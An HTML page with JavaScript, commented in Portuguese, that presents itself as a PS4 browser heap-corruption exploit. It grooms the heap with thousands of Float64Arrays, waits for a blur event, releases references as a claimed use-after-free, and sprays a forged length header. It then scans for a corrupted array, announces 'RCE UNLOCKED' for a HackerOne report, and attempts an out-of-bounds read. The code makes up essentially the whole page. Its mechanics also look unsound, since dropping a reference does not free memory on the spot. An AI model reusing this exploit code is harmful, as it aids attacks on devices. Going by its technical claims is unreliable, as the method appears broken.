<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 RCE SUITE V5.0 - AUTOMATED HEAP FUZZER</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; font-size: 14px; }
        .dashboard { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; border: 1px solid #333; padding: 20px; }
        .stat-box { border: 1px solid #444; padding: 10px; background: #111; }
        .stat-val { font-size: 24px; font-weight: bold; color: #fff; }
        button { width: 100%; padding: 15px; font-size: 16px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; font-weight: bold; margin-top: 10px; }
        button:disabled { border-color: #555; color: #555; cursor: not-allowed; }
        #console { height: 400px; overflow-y: scroll; border: 1px solid #333; margin-top: 20px; padding: 10px; background: #050505; color: #ccc; }
        .critical { color: #ff0000; font-weight: bold; font-size: 1.5em; animation: blink 1s infinite; }
        .success { color: #00ffff; font-weight: bold; font-size: 1.2em; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>

<h1>PS4 HEAP FUZZER V5.0 (RCE HUNTER)</h1>

<div class="dashboard">
    <div class="stat-box">
        <div>STATUS DO SISTEMA</div>
        <div id="status" class="stat-val" style="color:yellow">AGUARDANDO</div>
    </div>
    <div class="stat-box">
        <div>ARRAYS ALOCADOS</div>
        <div id="allocCount" class="stat-val">0</div>
    </div>
    <div class="stat-box">
        <div>OBJETOS VIZINHOS</div>
        <div id="neighborCount" class="stat-val">0</div>
    </div>
    <div class="stat-box">
        <div>RESULTADO</div>
        <div id="result" class="stat-val">---</div>
    </div>
</div>

<button id="btnRun" onclick="initFuzzer()">INICIAR AUTO-FUZZER (SEQU√äNCIA COMPLETA)</button>

<div id="console"></div>

<script>
    const CONSOLE = document.getElementById('console');
    function log(msg) { CONSOLE.innerHTML = `[${Date.now()}] ${msg}<br>` + CONSOLE.innerHTML; }

    // --- CONFIGURA√á√ÉO DE RCE ---
    // O valor m√°gico que transforma um array comum em um "God Array" (Length=0x10000)
    // 0x0001000000000100 (Length + Flags para JSObject)
    const FAKE_LENGTH = 1.3906717577229e-309; 
    
    // Marcador para verificar escrita se o length falhar
    const MARKER = 1337.1337;

    // Tamanho do Objeto alvo (1024 floats = 8KB Page Aligned)
    // Isso √© crucial. Arrays pequenos (size<128) s√£o inst√°veis. 1024 √© s√≥lido.
    const OBJECT_SIZE = 1024;
    
    // O spray deve ser maior que o buraco para garantir overflow
    const SPRAY_SIZE = 1200; 

    var neighbors = [];
    var victims = [];
    var sprayStorage = [];
    
    const PAIR_COUNT = 8000; // Quantidade massiva para estat√≠stica a nosso favor

    function initFuzzer() {
        document.getElementById('btnRun').disabled = true;
        document.getElementById('status').innerText = "ALOCANDO...";
        
        // Timeout para n√£o travar a UI
        setTimeout(heapGrooming, 100);
    }

    function heapGrooming() {
        log(">>> FASE 1: HEAP FENG SHUI MASSIVO");
        log(`Alocando ${PAIR_COUNT} pares de arrays (Size: ${OBJECT_SIZE})...`);
        
        neighbors = [];
        victims = [];
        sprayStorage = [];

        try {
            for(let i=0; i<PAIR_COUNT; i++) {
                // VIZINHO (Alvo): Ser√° corrompido
                let n = new Float64Array(OBJECT_SIZE);
                n[0] = 0.1; // Marcador de integridade
                n.idx = i;  // Identificador
                neighbors.push(n);

                // V√çTIMA (Buraco): Ser√° liberado
                let v = new Float64Array(OBJECT_SIZE);
                v.fill(1.1);
                victims.push(v);
            }

            document.getElementById('allocCount').innerText = (PAIR_COUNT * 2);
            document.getElementById('neighborCount').innerText = PAIR_COUNT;
            document.getElementById('status').innerText = "PRONTO P/ GATILHO";
            
            log("Heap organizado. Padr√£o: [VIZINHO][V√çTIMA][VIZINHO][V√çTIMA]...");
            log(">>> INSTRU√á√ÉO: APERTE O BOT√ÉO 'OPTIONS' AGORA!");
            log(">>> O sistema detectar√° o BLUR e iniciar√° o ataque automaticamente.");

            triggerListener();

        } catch(e) {
            log("ERRO FATAL NA ALOCA√á√ÉO: " + e);
        }
    }

    function triggerListener() {
        var el = document.documentElement;
        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();

        // O Aut√¥mato de Ataque
        window.onblur = function() {
            document.getElementById('status').innerText = "EXPLORANDO...";
            document.body.style.background = "#220000"; // Feedback visual
            log(">>> BLUR DETECTADO. INICIANDO RACE CONDITION.");

            // 1. LIBERA√á√ÉO (UAF)
            victims = null; // Cria 8000 buracos na mem√≥ria instantaneamente

            // 2. SPRAY "RAINBOW" (SHOTGUN)
            // Tentamos preencher os buracos + transbordar para os vizinhos
            doSpray();

            // 3. SCANNER AUTOM√ÅTICO
            // Espera 50ms para a mem√≥ria assentar e roda a per√≠cia
            setTimeout(scanMemory, 100);
        };
    }

    function doSpray() {
        log(">>> FASE 2: INJETANDO PAYLOAD (RAINBOW PATTERN)...");
        
        try {
            // Criamos um 'Master Spray' pr√©-populado para ser r√°pido
            // Padr√£o: [HEADER, MARKER, HEADER, MARKER...]
            // Isso cobre alinhamentos de 0 e 8 bytes.
            const masterPattern = new Float64Array(SPRAY_SIZE);
            for(let k=0; k<SPRAY_SIZE; k+=2) {
                masterPattern[k] = FAKE_LENGTH;   // Tenta acertar o Header Length
                masterPattern[k+1] = MARKER;      // Tenta acertar dados
            }

            // Clona o master pattern 10.000 vezes para entupir o Heap
            for(let i=0; i<12000; i++) {
                // slice(0) √© uma forma r√°pida de clonar em JS antigo
                sprayStorage.push(masterPattern.slice(0)); 
            }
        } catch(e) { log("Erro no spray: " + e); }
    }

    function scanMemory() {
        log(">>> FASE 3: SCANNER FORENSE AUTOM√ÅTICO");
        document.getElementById('status').innerText = "ANALISANDO...";
        
        let godModeFound = false;
        let writeFound = false;

        // Varredura de alta velocidade
        for(let i=0; i<neighbors.length; i++) {
            let n = neighbors[i];
            
            // CHECAGEM DE OURO: LENGTH
            if(n.length !== OBJECT_SIZE) {
                godModeFound = true;
                reportSuccess("GOD_MODE", i, n.length);
                break; // Achamos o RCE, pode parar
            }

            // CHECAGEM DE PRATA: DADOS
            if(n[0] !== 0.1) {
                // Verifica se √© o nosso marker ou lixo
                if(n[0] === MARKER || n[0] === FAKE_LENGTH) {
                    writeFound = true;
                    log(`[+] Write Primitive detectado no Index ${i}. Valor: ${n[0]}`);
                    // N√£o paramos, continuamos procurando o God Mode
                }
            }
        }

        if(godModeFound) {
            document.getElementById('result').innerText = "SUCESSO CR√çTICO";
            document.getElementById('result').style.color = "#0ff";
            document.body.style.background = "#004400";
        } else if (writeFound) {
            document.getElementById('result').innerText = "WRITE PRIMITIVE";
            document.getElementById('result').style.color = "orange";
            log("Temos escrita, mas o alinhamento errou o Header de Length.");
            log("Tente ajustar SPRAY_SIZE ligeiramente (ex: 1208, 1216).");
        } else {
            document.getElementById('result').innerText = "FALHA";
            document.getElementById('result').style.color = "red";
            log("Nenhum vizinho foi afetado.");
            log("Diagn√≥stico: O spray pode estar caindo em uma regi√£o diferente (Heap Isolation).");
        }
    }

    function reportSuccess(type, index, val) {
        let msg = "";
        if(type === "GOD_MODE") {
            msg = `<div class='critical'>üö® RCE UNLOCKED! üö®</div>
                   <div>VIZINHO ${index} CORROMPIDO COM SUCESSO.</div>
                   <div>LENGTH ORIGINAL: ${OBJECT_SIZE}</div>
                   <div>NOVO LENGTH: ${val}</div>
                   <div><br>O que fazer agora:</div>
                   <div>1. Tire uma foto DESSA TELA.</div>
                   <div>2. No HackerOne, diga: "I have achieved Arbitrary R/W by corrupting a Float64Array length to ${val}."</div>`;
        }
        log(msg);
        
        // PROVA DE LEITURA (OOB READ)
        try {
            log(">>> TESTE DE LEITURA OOB (Proof of Power):");
            // Tenta ler muito al√©m do limite original
            let leak = neighbors[index][OBJECT_SIZE + 50]; 
            log(`Lendo offset ${OBJECT_SIZE + 50}: ${leak}`);
        } catch(e) { log("Erro na leitura OOB: " + e); }
    }

</script>
</body>
</html>
